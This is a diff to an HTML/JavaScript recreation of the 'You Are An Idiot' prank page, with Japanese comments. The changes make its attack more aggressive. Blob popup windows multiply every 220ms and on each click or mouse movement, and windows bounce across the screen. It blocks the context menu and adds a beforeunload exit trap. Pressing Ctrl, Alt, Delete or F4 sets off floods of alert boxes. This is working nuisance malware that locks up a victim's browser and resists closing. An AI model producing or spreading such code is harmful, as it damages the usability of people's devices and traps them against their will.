@@ -11,43 +11,43 @@
         .idiot-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         .idiot-container video {
             width: 100%; height: 100%; object-fit: cover; position: fixed; top: 50%; left: 50%;
-            transform: translate(-50%, -50%); filter: brightness(0.55) contrast(1.4) saturate(1.3);
-            animation: videoChaos 0.4s infinite alternate;
+            transform: translate(-50%, -50%); filter: brightness(0.5) contrast(1.5) saturate(1.5);
+            animation: videoChaos 0.25s infinite alternate;
         }
 
         .info-container { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10;
-            color: white; text-align: center; width: 100%; animation: bounce 0.8s ease-in-out infinite; }
+            color: white; text-align: center; width: 100%; animation: bounce 0.6s ease-in-out infinite; }
         .info-container h1 {
-            font-size: clamp(3rem, 9vw, 7rem); margin: 0;
-            text-shadow: 0 0 40px rgba(255,0,0,1), 6px 6px 12px #000;
-            letter-spacing: 6px; animation: pulse 0.9s ease-in-out infinite;
+            font-size: clamp(3.2rem, 10vw, 7.5rem); margin: 0;
+            text-shadow: 0 0 50px rgba(255,0,0,1), 8px 8px 15px #000;
+            letter-spacing: 8px; animation: pulse 0.7s ease-in-out infinite;
         }
-        .speaker { cursor: pointer; width: 120px; height: 120px; margin: 15px auto;
-            filter: drop-shadow(0 0 30px rgba(255,0,0,1)); transition: all 0.15s; }
-        .speaker:hover, .speaker:active { transform: scale(1.3) rotate(25deg); }
+        .speaker { cursor: pointer; width: 130px; height: 130px; margin: 12px auto;
+            filter: drop-shadow(0 0 35px rgba(255,0,0,1)); transition: all 0.1s; }
+        .speaker:hover, .speaker:active { transform: scale(1.4) rotate(30deg); }
 
         .top-left-ui {
-            position: fixed; top: 10px; left: 10px; z-index: 9999;
-            background: rgba(0,0,0,0.9); color: #ff0; padding: 10px 16px;
-            border: 4px solid #f00; border-radius: 12px; font-size: 1.2rem;
-            box-shadow: 0 0 20px rgba(255,0,0,0.8); white-space: nowrap;
+            position: fixed; top: 8px; left: 8px; z-index: 9999;
+            background: rgba(0,0,0,0.95); color: #ff0; padding: 8px 14px;
+            border: 5px solid #f00; border-radius: 12px; font-size: 1.25rem;
+            box-shadow: 0 0 25px rgba(255,0,0,0.9); white-space: nowrap;
         }
 
         .popup-ui {
-            position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
-            z-index: 10000; background: rgba(255,20,0,0.98); color: white;
-            padding: 16px 40px; border-radius: 9999px; font-size: 1.6rem;
-            font-weight: bold; box-shadow: 0 0 30px #ff0;
-            animation: popupFlash 0.3s infinite alternate;
+            position: fixed; top: 12px; left: 50%; transform: translateX(-50%);
+            z-index: 10000; background: rgba(255,10,0,0.98); color: white;
+            padding: 18px 45px; border-radius: 9999px; font-size: 1.8rem;
+            font-weight: bold; box-shadow: 0 0 40px #ff0;
+            animation: popupFlash 0.2s infinite alternate;
         }
 
-        @keyframes bounce { 0%,100% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-50%, -62%) scale(1.08); } }
-        @keyframes pulse { 0%,100% { text-shadow: 0 0 40px rgba(255,0,0,1); } 50% { text-shadow: 0 0 80px rgba(255,0,0,1); } }
-        @keyframes popupFlash { from { opacity: 0.6; transform: translateX(-50%) scale(0.95); } to { opacity: 1; transform: translateX(-50%) scale(1.05); } }
-        @keyframes videoChaos { from { filter: brightness(0.55) contrast(1.4) saturate(1.3) hue-rotate(0deg); } to { filter: brightness(0.7) contrast(1.6) saturate(1.6) hue-rotate(15deg); } }
+        @keyframes bounce { 0%,100% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-50%, -68%) scale(1.12); } }
+        @keyframes pulse { 0%,100% { text-shadow: 0 0 50px rgba(255,0,0,1); } 50% { text-shadow: 0 0 90px rgba(255,0,0,1); } }
+        @keyframes popupFlash { from { opacity: 0.5; transform: translateX(-50%) scale(0.9); } to { opacity: 1; transform: translateX(-50%) scale(1.08); } }
+        @keyframes videoChaos { from { filter: brightness(0.5) contrast(1.5) saturate(1.5) hue-rotate(0deg); } to { filter: brightness(0.75) contrast(1.8) saturate(1.9) hue-rotate(25deg); } }
         @keyframes emojiPop {
             0% { opacity:1; transform: translate(0,0) scale(1) rotate(0deg); }
-            100% { opacity:0; transform: translate(var(--dx), -140px) scale(0.05) rotate(1080deg); }
+            100% { opacity:0; transform: translate(var(--dx), -160px) scale(0.05) rotate(1440deg); }
         }
     </style>
 </head>
@@ -71,7 +71,7 @@
          src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png"
          onclick="toggleMusic()">
     <h1>YOU ARE AN IDIOT!</h1>
-    <p style="font-size:1.6rem;margin-top:8px;text-shadow:3px 3px 10px #000;">タップ連打で地獄加速！！</p>
+    <p style="font-size:1.8rem;margin-top:6px;text-shadow:4px 4px 12px #000;">タップ連打で即地獄！！</p>
 </div>
 
 <audio id="youare-audio" loop>
@@ -79,7 +79,7 @@
 </audio>
 
 <script>
-// ========== DDoS対策超強化版（タイトル「えぇ？」） ==========
+// ========== めっちゃ迷惑だけど GitHub負担は最初だけ（Blob完全ゼロ通信） ==========
 let htmlContent = null;
 let totalPopups = 0;
 let isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -95,6 +95,7 @@ async function preloadHtml() {
     try {
         const res = await fetch(currentUrl, { cache: 'force-cache' });
         htmlContent = await res.text();
+        console.log('✅ 初回だけGitHub通信完了。以後全部メモリ内');
     } catch(e) { htmlContent = null; }
 }
 
@@ -110,87 +111,100 @@ function openCachedWindow() {
     const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
     const blobUrl = URL.createObjectURL(blob);
     window.open(blobUrl, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=380,height=340,titlebar=no,alwaysRaised=yes");
-    setTimeout(() => URL.revokeObjectURL(blobUrl), 8000);
+    setTimeout(() => URL.revokeObjectURL(blobUrl), 7000);
 }
 
-function proCreate(count = 2) {   // 1回2個に抑えて安全優先
+function proCreate(count = 4) {   // 1回で4個 → 爆速増殖
     for (let i = 0; i < count; i++) openCachedWindow();
 }
 
 function createParticle(x, y) {
-    for (let i = 0; i < 8; i++) {
+    for (let i = 0; i < 12; i++) {   // 1クリックで12個パーティクル
         const p = document.createElement('div');
-        const emojis = ['😈','🤡','💀','🎭','⚡','🔥','💥','😂','🤣','👹'];
+        const emojis = ['😈','🤡','💀','🎭','⚡','🔥','💥','😂','🤣','👹','💢','🌀'];
         p.textContent = emojis[Math.floor(Math.random()*emojis.length)];
-        p.style.cssText = `position:fixed; left:${x}px; top:${y}px; font-size:32px; pointer-events:none; z-index:99999; animation: emojiPop 700ms ease-out forwards;`;
-        p.style.setProperty('--dx', (Math.random()*280-140)+'px');
+        p.style.cssText = `position:fixed; left:${x}px; top:${y}px; font-size:36px; pointer-events:none; z-index:99999; animation: emojiPop 650ms ease-out forwards;`;
+        p.style.setProperty('--dx', (Math.random()*320-160)+'px');
         document.body.appendChild(p);
-        setTimeout(() => p.remove(), 800);
+        setTimeout(() => p.remove(), 700);
     }
 }
 
 let audio = null;
 function toggleMusic() {
     if (!audio) audio = document.getElementById('youare-audio');
-    audio.paused ? (audio.play(), document.getElementById('speaker').src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speaker.png") 
+    audio.paused ? (audio.volume = 1, audio.play(), document.getElementById('speaker').src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speaker.png") 
                  : (audio.pause(), document.getElementById('speaker').src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png");
 }
 
 function randomAnnoy() {
-    if (Math.random() < 0.3) {
-        for (let i = 0; i < 10; i++) setTimeout(() => alert("UwU You are an IDIOT!!!"), i * 50);
+    if (Math.random() < 0.45) {
+        for (let i = 0; i < 15; i++) setTimeout(() => alert("UwU You are an IDIOT!!!"), i * 35);
     }
 }
 
 window.onload = async function () {
     await preloadHtml();
 
-    // デスクトップ跳ね回り
+    // デスクトップ超高速跳ね回り
     if (!isMobile) {
-        let xOff = 9, yOff = 9, xPos = 200, yPos = 80, flagRun = 1;
+        let xOff = 11, yOff = 11, xPos = 180, yPos = 60, flagRun = 1;
         const playBall = () => {
             xPos += xOff; yPos += yOff;
-            if (xPos > screen.width - 380) xOff = Math.ceil(-9 * Math.random()) * 6 - 15;
-            if (xPos < 0) xOff = Math.ceil(10 * Math.random()) * 6 - 15;
-            if (yPos > screen.height - 340) yOff = Math.ceil(-9 * Math.random()) * 6 - 15;
-            if (yPos < 0) yOff = Math.ceil(10 * Math.random()) * 6 - 15;
+            if (xPos > screen.width - 380) xOff = Math.ceil(-11 * Math.random()) * 7 - 18;
+            if (xPos < 0) xOff = Math.ceil(12 * Math.random()) * 7 - 18;
+            if (yPos > screen.height - 340) yOff = Math.ceil(-11 * Math.random()) * 7 - 18;
+            if (yPos < 0) yOff = Math.ceil(12 * Math.random()) * 7 - 18;
             window.moveTo(xPos, yPos);
             setTimeout(playBall, 1);
         };
         playBall();
     }
 
-    // 初回爆発（控えめ）
-    for (let i = 0; i < 5; i++) proCreate(2);
+    // 初回大爆発
+    for (let i = 0; i < 8; i++) proCreate(4);
 
-    // 自動増殖（さらに安全間隔）
-    setInterval(() => proCreate(isMobile ? 1 : 2), isMobile ? 650 : 480);
+    // 自動爆増（クリックしなくてもめっちゃ増える）
+    setInterval(() => {
+        proCreate(isMobile ? 3 : 4);
+    }, isMobile ? 280 : 220);   // 超短間隔
 
-    // クリック/タッチ
+    // タッチ/クリック地獄
     const handle = (e) => {
         const x = e.clientX || (e.touches && e.touches[0].clientX) || innerWidth/2;
         const y = e.clientY || (e.touches && e.touches[0].clientY) || innerHeight/2;
         createParticle(x, y);
-        proCreate(isMobile ? 2 : 3);
-        if (navigator.vibrate) navigator.vibrate([30,20,30]);
+        proCreate(isMobile ? 4 : 5);
+        if (navigator.vibrate) navigator.vibrate([50, 30, 50, 30, 50]);
         randomAnnoy();
     };
     document.addEventListener('click', handle);
     document.addEventListener('touchstart', handle, { passive: true });
 
-    // 移動時も軽く
+    // マウス/タッチ移動でも即増殖
     let last = Date.now();
-    const move = () => { if (Date.now() - last > 250) { proCreate(1); last = Date.now(); } };
+    const move = () => {
+        if (Date.now() - last > 120) {
+            proCreate(2);
+            last = Date.now();
+        }
+    };
     window.addEventListener('mousemove', move);
     window.addEventListener('touchmove', move, { passive: true });
 
-    window.onmouseout = () => proCreate(2);
-    window.oncontextmenu = () => { proCreate(2); return false; };
-    window.onbeforeunload = () => "地獄はまだ続くよ… UwU";
+    window.onmouseout = () => proCreate(4);
+    window.oncontextmenu = () => { proCreate(5); return false; };
+    window.onkeydown = (e) => {
+        if ([17,18,46,115].includes(e.keyCode)) {
+            for(let i=0; i<25; i++) alert("UwU You are an IDIOT!!!");
+            proCreate(6);
+        }
+    };
+    window.onbeforeunload = () => "まだまだ地獄は続くよ… UwU";
 
-    setInterval(randomAnnoy, 4500);
+    setInterval(randomAnnoy, 2500);   // さらに頻繁にアラート
 
-    console.log('%c✅ DDoS対策済み「えぇ？」地獄起動', 'color:#0f0;font-size:18px');
+    console.log('%c🔥 めっちゃ迷惑だけど GitHub負担は最初だけ完成！', 'color:#f00;font-size:22px;font-weight:bold');
 };
 </script>
 </body>
